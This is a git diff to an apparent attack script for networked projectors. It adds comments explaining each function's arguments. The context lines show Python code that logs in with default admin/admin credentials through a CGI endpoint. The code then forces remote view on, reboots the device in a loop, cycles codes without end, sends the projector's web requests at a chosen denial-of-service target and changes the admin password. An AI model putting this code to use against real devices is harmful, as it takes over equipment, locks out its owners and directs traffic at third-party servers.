@@ -15,6 +15,8 @@ import random
 import urllib3
 
 urllib3.disable_warnings()
+
+#host is the projector, username is generally admin, password is generally admin
 def AdminLogin(host,username,password):
     print("Trying to login now")
 
@@ -39,7 +41,7 @@ def AdminLogin(host,username,password):
     cookieMid=cookieStart[1].split("'")
     cookie=cookieMid[0]
     return cookie
-
+#host is the target, coookie is cookie from AdminLogin
 def ToggleRemote(host, cookie):
     #Turn Remove View Off
     url = "https://"+ host + "/cgi-bin/return.cgi"
@@ -49,6 +51,7 @@ def ToggleRemote(host, cookie):
     remoteViewOn = requests.post(url=url,data=data, verify=False)
     print("Remote View Active")
 
+#host is the target, coookie is cookie from AdminLogin, loop is True or False
 def Reboot(host, cookie, loop):
     url = "https://"+ host + "/cgi-bin/return.cgi"
     data = {
@@ -59,6 +62,8 @@ def Reboot(host, cookie, loop):
         reboot = requests.post(url=url,data=data, verify=False)
 
     print("Reboot Incoming")
+    
+#host is the target, coookie is cookie from AdminLogin, WebServer is dos target
 def WebDos(host,cookie,WebServer):
     WebServer="YourTargetHere"
     url = "https://"+ host + "/cgi-bin/return.cgi"
@@ -68,6 +73,7 @@ def WebDos(host,cookie,WebServer):
     remoteViewOn = requests.post(url=url,data=data, verify=False)
     print("Web Request Sent")
 
+    #host is the target, coookie is cookie from AdminLogin
 def CodeCycle(host, cookie):
     while True:
             randomInt = random.randint(1,9999)
@@ -77,7 +83,8 @@ def CodeCycle(host, cookie):
             }
             remoteViewOn = requests.post(url=url,data=data, verify=False)
             print("Cycle")
-
+            
+#host is the target, coookie is cookie from AdminLogin,newPass is the pass you want to change it to
 def ChangePass(host, cookie, newPass):
     url = "https://"+ host + "/cgi-bin/return.cgi"
     data = {
